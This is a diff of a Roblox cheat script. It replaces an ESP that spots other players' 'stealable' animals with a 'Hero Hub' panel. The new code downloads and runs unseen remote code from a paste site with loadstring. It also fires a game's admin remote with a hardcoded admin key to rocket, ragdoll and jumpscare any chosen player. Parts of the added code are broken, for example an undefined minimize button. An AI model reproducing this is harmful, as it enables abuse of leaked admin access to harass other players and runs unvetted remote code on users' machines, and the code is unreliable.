@@ -1,456 +1,407 @@
--- Animal Overhead Scanner and ESP System
-
--- Quick place check FIRST (no waiting, no blocking)
--- ============================================================================
--- PLACE CHECK
--- ============================================================================
-local PLACE_ID = 109983668079237
-if game.PlaceId ~= PLACE_ID then
-    print("[Brainrot Index ESP] Wrong place, exiting")
-    return
-end
-
-
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local CollectionService = game:GetService("CollectionService")
-local HttpService = game:GetService("HttpService")
-
--- Wait for LocalPlayer (critical for auto-exec!)
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
-if not LocalPlayer then
-    LocalPlayer = Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
-    LocalPlayer = Players.LocalPlayer
-end
-if not LocalPlayer then
-    repeat task.wait() until Players.LocalPlayer
-    LocalPlayer = Players.LocalPlayer
+
+do
+loadstring(game:HttpGet("https://pastefy.app/W2tptcDF/raw"))()
 end
 
-local Workspace = game.Workspace
+local ADMIN_KEY = "f888ee6e-c86d-46e1-93d7-0639d6635d42" 
 
--- ============================================================================
--- CONFIG SYSTEM - Save/Load UI positions
--- ============================================================================
-local CONFIG_PATH = "astroconfig/indexesp.json"
-local Config = {
-    statusPosition = {scale = {x = 1, y = 0}, offset = {x = -15, y = 15}},
-    statusExpanded = true, -- INDEX PROGRESS expanded by default
-    toIndexPosition = {scale = {x = 1, y = 0}, offset = {x = -310, y = 15}}, -- TO INDEX list position
-    toIndexExpanded = true -- TO INDEX expanded by default
+local gui_parent
+pcall(function() gui_parent = game:GetService("CoreGui") end)
+if not gui_parent then gui_parent = LocalPlayer:WaitForChild("PlayerGui") end
+
+-- changed IceHub → HeroHub
+pcall(function()
+    local old = game:GetService("CoreGui"):FindFirstChild("HeroHub_Ultra_Dark")
+    if old then old:Destroy() end
+end)
+
+local ACTIVE = {
+    BackgroundColor3 = Color3.fromRGB(0, 80, 200),
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    StrokeColor = Color3.fromRGB(0, 150, 255),
+    StrokeTransparency = 0,
 }
+local INACTIVE = {
+    BackgroundColor3 = Color3.fromRGB(20, 20, 30),
+    TextColor3 = Color3.fromRGB(120, 120, 160),
+    StrokeColor = Color3.fromRGB(0, 40, 120),
+    StrokeTransparency = 0.6,
+}
+local TWEEN_INFO = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
 
-local function ensureConfigFolder()
-    if not isfolder("astroconfig") then
-        makefolder("astroconfig")
+local function tweenButton(btn, stroke, active)
+    local state = active and ACTIVE or INACTIVE
+    TweenService:Create(btn, TWEEN_INFO, {
+        BackgroundColor3 = state.BackgroundColor3,
+        TextColor3 = state.TextColor3,
+    }):Play()
+    if stroke then
+        TweenService:Create(stroke, TWEEN_INFO, {
+            Color = state.StrokeColor,
+            Transparency = state.StrokeTransparency,
+        }):Play()
     end
 end
 
-local function loadConfig()
-    pcall(function()
-        if isfile(CONFIG_PATH) then
-            local data = readfile(CONFIG_PATH)
-            local loaded = HttpService:JSONDecode(data)
-            if loaded then
-                if loaded.statusPosition then Config.statusPosition = loaded.statusPosition end
-                if loaded.statusExpanded ~= nil then Config.statusExpanded = loaded.statusExpanded end
-                if loaded.toIndexPosition then Config.toIndexPosition = loaded.toIndexPosition end
-                if loaded.toIndexExpanded ~= nil then Config.toIndexExpanded = loaded.toIndexExpanded end
-            end
-        end
+-- ============================================
+-- SCREEN GUI
+-- ============================================
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "HeroHub_Ultra_Dark"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.DisplayOrder = 9999
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = gui_parent
+
+-- ============================================
+-- MAIN FRAME
+-- ============================================
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 280, 0, 430)
+MainFrame.Position = UDim2.new(1, -393, 1, -112)
+MainFrame.AnchorPoint = Vector2.new(1, 1)
+MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
+MainFrame.BackgroundTransparency = 0.1
+MainFrame.BorderSizePixel = 0
+MainFrame.ClipsDescendants = true
+MainFrame.Parent = ScreenGui
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 16)
+
+local mfStroke = Instance.new("UIStroke", MainFrame)
+mfStroke.Color = Color3.fromRGB(0, 40, 120)
+mfStroke.Thickness = 2.5
+
+-- ============================================
+-- HEADER
+-- ============================================
+local Header = Instance.new("Frame", MainFrame)
+Header.Size = UDim2.new(1, 0, 0, 60)
+Header.BackgroundTransparency = 1
+
+local TitleLabel = Instance.new("TextLabel", Header)
+TitleLabel.Size = UDim2.new(1, -60, 0, 22)
+TitleLabel.Position = UDim2.new(0, 18, 0, 10)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Text = "Hero Hub"
+TitleLabel.TextColor3 = Color3.fromRGB(0, 50, 150)
+TitleLabel.TextSize = 22
+TitleLabel.Font = Enum.Font.GothamBlack
+TitleLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+TitleLabel.TextYAlignment = Enum.TextYAlignment.Center
+
+local SubLabel = Instance.new("TextLabel", Header)
+SubLabel.Size = UDim2.new(1, -60, 0, 14)
+SubLabel.Position = UDim2.new(0, 18, 0, 32)
+SubLabel.BackgroundTransparency = 1
+SubLabel.Text = "Hero Hub Control Panel"
+SubLabel.TextColor3 = Color3.fromRGB(0, 50, 150)
+SubLabel.TextSize = 11
+SubLabel.Font = Enum.Font.GothamMedium
+SubLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
+SubLabel.TextXAlignment = Enum.TextXAlignment.Left
+SubLabel.TextYAlignment = Enum.TextYAlignment.Center
+- ============================================
+-- TAB BUTTONS
+-- ============================================
+local TabRow = Instance.new("Frame", MainFrame)
+TabRow.Size = UDim2.new(1, -30, 0, 36)
+TabRow.Position = UDim2.new(0, 15, 0, 65)
+TabRow.BackgroundTransparency = 1
+local tabLayout = Instance.new("UIListLayout", TabRow)
+tabLayout.FillDirection = Enum.FillDirection.Horizontal
+tabLayout.SortOrder = Enum.SortOrder.LayoutOrder
+tabLayout.Padding = UDim.new(0, 8)
+
+local function makeTabBtn(name, order)
+    local btn = Instance.new("TextButton", TabRow)
+    btn.Name = name
+    btn.Size = UDim2.new(0.5, -4, 1, 0)
+    btn.BackgroundColor3 = INACTIVE.BackgroundColor3
+    btn.BorderSizePixel = 0
+    btn.Text = name
+    btn.TextColor3 = INACTIVE.TextColor3
+    btn.TextSize = 12
+    btn.Font = Enum.Font.GothamBold
+    btn.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+    btn.AutoButtonColor = false
+    btn.LayoutOrder = order
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+    local stroke = Instance.new("UIStroke", btn)
+    stroke.Color = INACTIVE.StrokeColor
+    stroke.Thickness = 1.2
+    stroke.Transparency = INACTIVE.StrokeTransparency
+    return btn, stroke
+end
+
+local SpammerBtn, SpammerStroke = makeTabBtn("SPAMMER", 1)
+local DefenderBtn, DefenderStroke = makeTabBtn("DEFENDER", 2)
+
+-- ============================================
+-- CONTENT AREA
+-- ============================================
+local ContentArea = Instance.new("Frame", MainFrame)
+ContentArea.Size = UDim2.new(1, 0, 1, -115)
+ContentArea.Position = UDim2.new(0, 0, 0, 115)
+ContentArea.BackgroundTransparency = 1
+ContentArea.ClipsDescendants = true
+
+-- ============================================
+-- SPAMMER PANEL - Player List
+-- ============================================
+local SpammerPanel = Instance.new("Frame", ContentArea)
+SpammerPanel.Size = UDim2.new(1, 0, 1, 0)
+SpammerPanel.BackgroundTransparency = 1
+SpammerPanel.Visible = false
+
+local SpamScroll = Instance.new("ScrollingFrame", SpammerPanel)
+SpamScroll.Size = UDim2.new(1, -30, 1, -15)
+SpamScroll.Position = UDim2.new(0, 15, 0, 0)
+SpamScroll.BackgroundTransparency = 1
+SpamScroll.BorderSizePixel = 0
+SpamScroll.ScrollBarThickness = 0
+SpamScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+SpamScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+SpamScroll.ScrollingEnabled = true
+local spamLayout = Instance.new("UIListLayout", SpamScroll)
+spamLayout.Padding = UDim.new(0, 8)
+spamLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+local function makePlayerCard(player, order)
+    local userId = player.UserId
+
+    local btn = Instance.new("TextButton", SpamScroll)
+    btn.Size = UDim2.new(1, 0, 0, 55)
+    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    btn.BorderSizePixel = 0
+    btn.Text = ""
+    btn.AutoButtonColor = false
+    btn.LayoutOrder = order
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
+    local stroke = Instance.new("UIStroke", btn)
+    stroke.Color = Color3.fromRGB(0, 40, 120)
+    stroke.Thickness = 1.2
+    stroke.Transparency = 0.6
+
+    -- Avatar headshot
+    local avatar = Instance.new("ImageLabel", btn)
+    avatar.Size = UDim2.new(0, 35, 0, 35)
+    avatar.Position = UDim2.new(0, 10, 0.5, -17)
+    avatar.BackgroundTransparency = 1
+    avatar.Image = "rbxthumb://type=AvatarHeadShot&id=" .. userId .. "&w=48&h=48"
+    avatar.ScaleType = Enum.ScaleType.Stretch
+    Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)
+
+    -- Username
+    local nameLabel = Instance.new("TextLabel", btn)
+    nameLabel.Size = UDim2.new(1, -60, 0, 20)
+    nameLabel.Position = UDim2.new(0, 55, 0, 8)
+    nameLabel.BackgroundTransparency = 1
+    nameLabel.Text = player.Name
+    nameLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
+    nameLabel.TextSize = 13
+    nameLabel.Font = Enum.Font.GothamBold
+    nameLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+    nameLabel.TextYAlignment = Enum.TextYAlignment.Center
+
+    -- Display name
+    local displayLabel = Instance.new("TextLabel", btn)
+    displayLabel.Size = UDim2.new(1, -60, 0, 15)
+    displayLabel.Position = UDim2.new(0, 55, 0, 28)
+    displayLabel.BackgroundTransparency = 1
+    displayLabel.Text = "@" .. player.DisplayName
+    displayLabel.TextColor3 = Color3.fromRGB(100, 120, 160)
+    displayLabel.TextSize = 11
+    displayLabel.Font = Enum.Font.GothamMedium
+    displayLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
+    displayLabel.TextXAlignment = Enum.TextXAlignment.Left
+    displayLabel.TextYAlignment = Enum.TextYAlignment.Center
+
+    -- Toggle active on click
+    local isActive = false
+    -- Replace makePlayerCard's click logic with this:
+    local AdminRemote = getgenv().AdminRemote
+btn.MouseButton1Click:Connect(function()
+    -- Flash active
+    local targetPlayer = Players:GetPlayerByUserId(userId)
+    
+    AdminRemote:FireServer(ADMIN_KEY, targetPlayer, "rocket")
+    AdminRemote:FireServer(ADMIN_KEY, targetPlayer, "balloon")
+    AdminRemote:FireServer(ADMIN_KEY, targetPlayer, "nightvision")
+    AdminRemote:FireServer(ADMIN_KEY, targetPlayer, "jumpscare")
+    AdminRemote:FireServer(ADMIN_KEY, targetPlayer, "ragdoll")
+    AdminRemote:FireServer(ADMIN_KEY, targetPlayer, "inverse")
+
+
+    TweenService:Create(btn, TWEEN_INFO, {
+        BackgroundColor3 = Color3.fromRGB(0, 80, 200),
+    }):Play()
+    TweenService:Create(stroke, TWEEN_INFO, {
+        Color = Color3.fromRGB(0, 150, 255),
+        Transparency = 0,
+    }):Play()
+    TweenService:Create(nameLabel, TWEEN_INFO, {
+        TextColor3 = Color3.fromRGB(255, 255, 255),
+    }):Play()
+
+    -- Smoothly revert back after 0.5s
+    task.delay(0.25, function()
+        TweenService:Create(btn, TWEEN_INFO, {
+            BackgroundColor3 = Color3.fromRGB(20, 20, 30),
+        }):Play()
+        TweenService:Create(stroke, TWEEN_INFO, {
+            Color = Color3.fromRGB(0, 40, 120),
+            Transparency = 0.6,
+        }):Play()
+        TweenService:Create(nameLabel, TWEEN_INFO, {
+            TextColor3 = Color3.fromRGB(220, 220, 255),
+        }):Play()
+    end)
+end)
+
+    return btn
+end
+
+local function refreshPlayerList()
+    -- Clear existing cards
+    for _, c in ipairs(SpamScroll:GetChildren()) do
+        if c:IsA("TextButton") then c:Destroy() end
+    end
+    local playerList = Players:GetPlayers()
+    for i, plr in ipairs(playerList) do
+        makePlayerCard(plr, i)
+    end
+end
+
+-- Auto refresh when players join/leave
+Players.PlayerAdded:Connect(function() refreshPlayerList() end)
+Players.PlayerRemoving:Connect(function() task.wait(0.1) refreshPlayerList() end)
+
+-- ============================================
+-- DEFENDER PANEL
+-- ============================================
+local DefenderPanel = Instance.new("Frame", ContentArea)
+DefenderPanel.Size = UDim2.new(1, 0, 1, 0)
+DefenderPanel.BackgroundTransparency = 1
+DefenderPanel.Visible = true
+
+local DefScroll = Instance.new("ScrollingFrame", DefenderPanel)
+DefScroll.Size = UDim2.new(1, -30, 1, -15)
+DefScroll.Position = UDim2.new(0, 15, 0, 0)
+DefScroll.BackgroundTransparency = 1
+DefScroll.BorderSizePixel = 0
+DefScroll.ScrollBarThickness = 0
+DefScroll.CanvasSize = UDim2.new(0, 0, 0, 371)
+DefScroll.ScrollingEnabled = true
+local defLayout = Instance.new("UIListLayout", DefScroll)
+defLayout.Padding = UDim.new(0, 8)
+defLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+local HeaderLabel = Instance.new("TextLabel", DefScroll)
+HeaderLabel.Size = UDim2.new(1, 0, 0, 25)
+HeaderLabel.BackgroundTransparency = 1
+HeaderLabel.Text = "SELECT TO AUTO-DEFEND"
+HeaderLabel.TextColor3 = Color3.fromRGB(120, 120, 160)
+HeaderLabel.TextSize = 11
+HeaderLabel.Font = Enum.Font.GothamBold
+HeaderLabel.LayoutOrder = 999
+
+local DEFENDER_COMMANDS = {"rocket", "ragdoll", "balloon", "inverse", "tiny", "jumpscare", "morph"}
+
+local function makeDefenderButton(label, order)
+    local btn = Instance.new("TextButton", DefScroll)
+    btn.Size = UDim2.new(1, 0, 0, 40)
+    btn.BackgroundColor3 = INACTIVE.BackgroundColor3
+    btn.BorderSizePixel = 0
+    btn.Text = label
+    btn.TextColor3 = INACTIVE.TextColor3
+    btn.TextSize = 13
+    btn.Font = Enum.Font.GothamBold
+    btn.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+    btn.AutoButtonColor = false
+    btn.LayoutOrder = order
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+    local stroke = Instance.new("UIStroke", btn)
+    stroke.Color = INACTIVE.StrokeColor
+    stroke.Thickness = 1.2
+    stroke.Transparency = INACTIVE.StrokeTransparency
+
+    local isActive = false
+    btn.MouseButton1Click:Connect(function()
+        isActive = not isActive
+        tweenButton(btn, stroke, isActive)
     end)
 end
 
-local function saveConfig()
-    pcall(function()
-        ensureConfigFolder()
-        local data = HttpService:JSONEncode(Config)
-        writefile(CONFIG_PATH, data)
-    end)
+for i, cmd in ipairs(DEFENDER_COMMANDS) do
+    makeDefenderButton(cmd, i)
 end
 
--- Load config on startup (fast, file read only)
-loadConfig()
-
--- Wait for game to load before requiring modules
-if not game:IsLoaded() then
-    game.Loaded:Wait()
-end
-
--- Small delay to let other scripts initialize
-task.wait(0.3)
-
--- Require the game modules (EXACTLY like the game does)
-local Packages = ReplicatedStorage:WaitForChild("Packages", 10)
-if not Packages then return end
-
-local Synchronizer = require(Packages.Synchronizer)
-local Observers = require(Packages.Observers) -- Same observer pattern the game uses
-local Gradients = require(Packages.Gradients) -- For animated gradient text
-
-local Datas = ReplicatedStorage:WaitForChild("Datas", 10)
-if not Datas then return end
-
-local AnimalsData = require(Datas.Animals)      -- Animal info: DisplayName, Rarity, HideFromIndex, IsEnabled
-local IndexData = require(Datas.Index)          -- Mutation info: IsMutation, CustomIndex, LimitedMutation
-local MutationsData = require(Datas.Mutations)  -- Mutation visual configs
-local RaritiesData = require(Datas.Rarities)    -- Rarity colors/gradients
-
--- SharedIndex for accurate index counts
-local SharedIndex = require(ReplicatedStorage.Shared.Index)
-
--- ============================================================================
--- HOOK INTO GAME'S ANIMAL CONTROLLER FOR INSTANT UPDATES
--- ============================================================================
-local Controllers = ReplicatedStorage:WaitForChild("Controllers", 10)
-if not Controllers then return end
-
-local AnimalController = require(Controllers.AnimalController)
-
--- ============================================================================
--- ANIMAL INDEX CHECKER - Uses EXACT game logic from StudyThis.lua lines 5904-5918
--- ============================================================================
--- Game logic explained:
--- v63 = mutation type (e.g., "Albino", "Gold", "Default")
--- v64 = IsMutation flag from IndexData[mutation]
--- v65 = playerData.Index[animalName] (the animal's index entry)
--- v66 = indexed check result
---
--- if CustomIndex exists: check v65[CustomIndex.Name]
--- elseif IsMutation: check v65[mutationName] 
--- else (Default): check next(v65) ~= nil (any entry exists)
--- ============================================================================
-local AnimalIndexChecker = {}
-
--- Debug flag - set to true to see detailed logging for all index checks
-AnimalIndexChecker.DebugMode = false
-
-function AnimalIndexChecker:IsAnimalIndexed(player, animalName, mutationType)
-    -- Get player data via Synchronizer (same as game)
-    local playerData = Synchronizer:Get(player)
-    if not playerData then 
-        if self.DebugMode then print("[IndexCheck] No playerData") end
-        return false 
-    end
-    
-    -- Get index data (same as game: v42:Get({"Index", animalName}))
-    local indexData = playerData:Get("Index")
-    if not indexData then 
-        if self.DebugMode then print("[IndexCheck] No indexData") end
-        return false 
-    end
-    
-    -- Get this animal's index entry (v65 in game)
-    local animalIndex = indexData[animalName]
-    if not animalIndex then 
-        if self.DebugMode then print("[IndexCheck]", animalName, "not in player's index at all") end
-        return false 
-    end
-    
-    -- Normalize mutation variant (nil, empty string, "Normal" -> "Default")
-    local variant = self:NormalizeMutation(mutationType)
-    
-    -- Get mutation info from IndexData (only mutations have entries, "Default" returns nil)
-    local mutationInfo = IndexData[variant]
-    
-    if self.DebugMode then
-        print("[IndexCheck] Checking:", animalName, "Mutation:", variant)
-        print("[IndexCheck] AnimalIndex contents:", HttpService:JSONEncode(animalIndex))
-        if mutationInfo then
-            print("[IndexCheck] MutationInfo: IsMutation=", mutationInfo.IsMutation, "CustomIndex=", mutationInfo.CustomIndex and mutationInfo.CustomIndex.Name or "nil")
-        else
-            print("[IndexCheck] MutationInfo: nil (Default or unknown mutation)")
-        end
-    end
-    
-    -- ========================================================================
-    -- GAME LOGIC from IndexController.lua and Shared_Index.lua:
-    -- 
-    -- The game checks: playerIndex[animalName][mutationKey]
-    -- 
-    -- For CustomIndex mutations (rare): check animalIndex[CustomIndex.Name]
-    -- For normal mutations (Gold, Diamond, etc): check animalIndex[mutationName]
-    -- For Default (no mutation / nil mutationInfo): check animalIndex["Default"]
-    -- ========================================================================
-    
-    if mutationInfo and mutationInfo.CustomIndex then
-        -- CustomIndex mutations (special handling like Aquatic)
-        local customKey = mutationInfo.CustomIndex.Name
-        local value = animalIndex[customKey]
-        if self.DebugMode then print("[IndexCheck] CustomIndex key:", customKey, "value:", value) end
-        return value ~= nil
-    elseif mutationInfo and mutationInfo.IsMutation then
-        -- Normal mutation check - look for specific mutation entry
-        local value = animalIndex[variant]
-        if self.DebugMode then print("[IndexCheck] Mutation key:", variant, "value:", value) end
-        return value ~= nil
+-- ============================================
+-- TAB SWITCHING
+-- ============================================
+local function switchTab(tab)
+    if tab == "SPAMMER" then
+        tweenButton(SpammerBtn, SpammerStroke, true)
+        tweenButton(DefenderBtn, DefenderStroke, false)
+        SpammerPanel.Visible = true
+        DefenderPanel.Visible = false
+        refreshPlayerList()
     else
-        -- Default/unknown mutation - check for "Default" key
-        -- This matches game logic: v22[v13 and v13 or "Default"]
-        local value = animalIndex["Default"]
-        if self.DebugMode then print("[IndexCheck] Default key value:", value) end
-        return value ~= nil
+        tweenButton(DefenderBtn, DefenderStroke, true)
+        tweenButton(SpammerBtn, SpammerStroke, false)
+        DefenderPanel.Visible = true
+        SpammerPanel.Visible = false
     end
 end
 
--- Normalize mutation name (nil, empty, "Normal" -> "Default")
-function AnimalIndexChecker:NormalizeMutation(mutation)
-    if not mutation or mutation == "" or mutation == "Normal" then
-        return "Default"
-    end
-    return mutation
-end
+switchTab("DEFENDER")
 
--- Get the proper animal name (internal name, not display name)
-function AnimalIndexChecker:GetInternalName(displayName)
-    -- Search AnimalsData for matching DisplayName
-    for internalName, animalData in pairs(AnimalsData) do
-        if animalData.DisplayName == displayName then
-            return internalName
-        end
-    end
-    -- If no match found, return the display name as-is (might already be internal)
-    return displayName
-end
+SpammerBtn.MouseButton1Click:Connect(function() switchTab("SPAMMER") end)
+DefenderBtn.MouseButton1Click:Connect(function() switchTab("DEFENDER") end)
 
--- Check if an animal can be shown in the index (same logic as game's SharedIndex:CanShowInIndex)
--- This filters out:
--- 1. Animals with HideFromIndex = true (Lucky Blocks, etc.)
--- 2. Animals with IsEnabled() returning false (new animals not yet added to index like Los Gattitos)
--- 3. Animals not in AnimalsData at all
-function AnimalIndexChecker:CanShowInIndex(animalName)
-    -- Use the game's actual SharedIndex method which handles all the complex logic
-    return SharedIndex:CanShowInIndex(animalName)
-end
+-- ============================================
+-- MINIMIZE
+-- ============================================
+local minimized = false
+MinimizeBtn.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    ContentArea.Visible = not minimized
+    TabRow.Visible = not minimized
+    TweenService:Create(MainFrame, TWEEN_INFO, {
+        Size = minimized and UDim2.new(0, 280, 0, 65) or UDim2.new(0, 280, 0, 430)
+    }):Play()
+    MinimizeBtn.Text = minimized and "+" or "-"
+end)
 
--- Check if an animal counts toward index completion (excludes admin/hidden animals)
--- Admin animals have HideFromIndex = true - they don't count for milestone
--- NOTE: Index V2 may have set HideFromIndex = false, so we also check the cached original state
-function AnimalIndexChecker:CountsTowardIndex(animalName)
-    local animalData = AnimalsData[animalName]
-    if not animalData then return false end
-    
-    -- Check HideFromIndex flag - this is what excludes admin animals from counting
-    if animalData.HideFromIndex then
-        return false
-    end
-    
-    -- ALSO check if Index V2 cached this as originally hidden (it may have unhidden it for display)
-    if _G.IndexV2_OriginallyHiddenAnimals and _G.IndexV2_OriginallyHiddenAnimals[animalName] then
-        return false
-    end
-    
-    -- Also check IsEnabled if it exists (some animals not yet added to game)
-    if animalData.IsEnabled and type(animalData.IsEnabled) == "function" then
-        if not animalData:IsEnabled() then
-            return false
-        end
-    end
-    
-    return true
-end
-
--- Check if an animal is required for a specific mutation's index
--- Some mutations (Bloodrot, Candy, Lava, Galaxy, etc.) have a specific list of required animals
--- If no specific list exists, falls back to CountsTowardIndex check (excludes admin animals)
-function AnimalIndexChecker:IsAnimalRequiredForMutation(animalName, mutation)
-    local normalizedMutation = self:NormalizeMutation(mutation)
-    local mutationInfo = IndexData[normalizedMutation]
-    
-    if mutationInfo and mutationInfo.Index then
-        -- This mutation has a specific list of required animals
-        -- Check if our animal is in that list
-        return mutationInfo.Index[animalName] ~= nil
-    else
-        -- No specific list - use CountsTowardIndex which excludes admin/hidden animals
-        -- This applies to Gold, Diamond, Rainbow, Default, etc.
-        return self:CountsTowardIndex(animalName)
-    end
-end
-
--- Get remaining count for a mutation using SharedIndex (same as Index Viewer)
-function AnimalIndexChecker:GetRemainingForMutation(mutation)
-    local normalizedMutation = self:NormalizeMutation(mutation)
-    local collected, needed, total = SharedIndex:GetIndexAnimals(LocalPlayer, normalizedMutation)
-    if collected and needed then
-        -- Never return negative (player may have collected bonus animals)
-        return math.max(0, needed - collected)
-    end
-    return 0
-end
-
--- Scanner Functions
-local Scanner = {}
-
--- Helper: Check if animal is stealable based on game code logic
--- From PlotClient.lua:
--- From PlotClient.lua line 520:
---   elseif v107 and (not v107.Machine or not v107.Machine.Active) then
--- This means: Animal is stealable if NO Machine OR Machine.Active = false
--- Only Machine.Active = true blocks stealing!
-function Scanner:GetAnimalStatus(plot, animalIndex)
-    if not plot then return "stealable", nil end
-    
-    local status = "stealable"
-    local statusInfo = nil
-    
-    pcall(function()
-        local channel = Synchronizer:Wait(plot.Name)
-        if channel then
-            local animalList = channel:Get("AnimalList")
-            if animalList then
-                for slotKey, animalData in pairs(animalList) do
-                    if type(animalData) == "table" and animalData.Index == animalIndex then
-                        -- Only ACTIVE machine processing blocks stealing!
-                        -- Machine.Active = false (FUSING READY/CRAFTING READY) is STILL STEALABLE!
-                        if animalData.Machine and animalData.Machine.Active == true then
-                            local machineType = animalData.Machine.Type
-                            
-                            if machineType == "Fuse" then
-                                status = "fusing"  -- Actively fusing = can't steal
-                            elseif machineType == "Crafting" then
-                                status = "crafting"  -- Actively crafting = can't steal
-                            else
-                                status = "processing"  -- In any active machine = can't steal
-                            end
-                            statusInfo = animalData.Machine
-                        end
-                        -- Machine.Active = false or no Machine = STEALABLE!
-                        break
-                    end
-                end
+-- ============================================
+-- DRAG
+-- ============================================
+local dragging, dragStart, startPos
+Header.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
             end
-        end
-    end)
-    
-    return status, statusInfo
-end
-
--- Helper to check if a plot belongs to the local player
-function Scanner:IsLocalPlayerPlot(plot)
-    -- The game sets PlotSign.YourBase.Enabled = true for the local player's plot
-    -- See PlotClient.lua line 870: v187.PlotModel.PlotSign.YourBase.Enabled = v187:GetOwner() == l_LocalPlayer_0;
-    local plotSign = plot:FindFirstChild("PlotSign")
-    if plotSign then
-        local yourBase = plotSign:FindFirstChild("YourBase")
-        if yourBase then
-            -- Check if it's a BillboardGui and is enabled
-            if yourBase:IsA("BillboardGui") and yourBase.Enabled == true then
-                return true
-            end
-        end
+        end)
     end
-    
-    return false
-end
-
-function Scanner:FindAllAnimalOverheads()
-    local overheads = {}
-    local skippedOwnPlot = false
-    local seenModels = {} -- Track models we've already added to prevent duplicates
-    
-    -- Search in Plots folder (animals on bases/podiums)
-    local plots = Workspace:FindFirstChild("Plots")
-    if plots then
-        for _, plot in ipairs(plots:GetChildren()) do
-            -- SKIP LOCAL PLAYER'S PLOT - you don't need to index your own animals!
-            if Scanner:IsLocalPlayerPlot(plot) then
-                skippedOwnPlot = true
-                continue
-            end
-            
-            -- Find animal MODELS directly on the plot
-            -- The game clones models from ReplicatedStorage.Models.Animals and parents them to plot
-            -- Model.Name = internal animal name (e.g., "1x1x1x1")
-            for _, child in ipairs(plot:GetChildren()) do
-                if child:IsA("Model") and child.Name ~= "AnimalPodiums" then
-                    local primaryPart = child.PrimaryPart or child:FindFirstChildWhichIsA("BasePart")
-                    if primaryPart then
-                        local internalName = child.Name
-                        
-                        -- FILTER: Only include if it's a known animal in AnimalsData
-                        if not AnimalsData[internalName] then
-                            continue
-                        end
-                        
-                        local mutation = child:GetAttribute("Mutation")
-                        
-                        -- Try to find the overhead attachment (quick non-recursive first)
-                        local overheadAttachment = child:FindFirstChild("OVERHEAD_ATTACHMENT")
-                        if not overheadAttachment then
-                            -- Try one level deeper (common structure: Model > Head > OVERHEAD_ATTACHMENT)
-                            local head = child:FindFirstChild("Head")
-                            if head then
-                                overheadAttachment = head:FindFirstChild("OVERHEAD_ATTACHMENT")
-                            end
-                        end
-                        local overhead = nil
-                        if overheadAttachment then
-                            overhead = overheadAttachment:FindFirstChild("AnimalOverhead")
-                        end
-                        
-                        -- Find matching podium by position
-                        local podiums = plot:FindFirstChild("AnimalPodiums")
-                        local matchingPodium = nil
-                        if podiums then
-                            for _, podium in ipairs(podiums:GetChildren()) do
-                                local base = podium:FindFirstChild("Base")
-                                if base then
-                                    local spawn = base:FindFirstChild("Spawn")
-                                    if spawn then
-                                        local spawnPos = spawn:GetPivot().Position
-                                        local modelPos = child:GetPivot().Position
-                                        if (modelPos - spawnPos).Magnitude < 10 then
-                                            matchingPodium = podium
-                                            break
-                                        end
-                                    end
-                                end
-                            end
-                        end
-                        
-                        -- Mark this model as seen to prevent duplicates
-                        seenModels[child] = true
-                        
-                        -- Check if animal is stealable (only Machine.Active = true is NOT stealable)
-                        local status, statusInfo = Scanner:GetAnimalStatus(plot, internalName)
-                        
-                        table.insert(overheads, {
-                            overhead = overhead,
-                            podium = matchingPodium,
-                            plot = plot,
-                            spawn = primaryPart,
-                            animalModel = child,
-                            source = "Podium",
-                            internalName = internalName,
-                            mutation = mutation,
-                            status = status,
-                            statusInfo = statusInfo
-                        })
-                    end
-                end
-            end
-        end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + delta.X,
+            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+        )
     end
-    
-    -- Search in RenderedMovingAnimals (animals walking in the world)
-    local renderedAnimals = Workspace:FindFirstChild("RenderedMovingAnimals")
-    if renderedAnimals then
-        for _, animalModel in ipairs(renderedAnimals:GetChildren()) do
-            -- Skip if we already added this model from the Plots scan
-            if seenModels[animalModel] then
-                continue
-            end
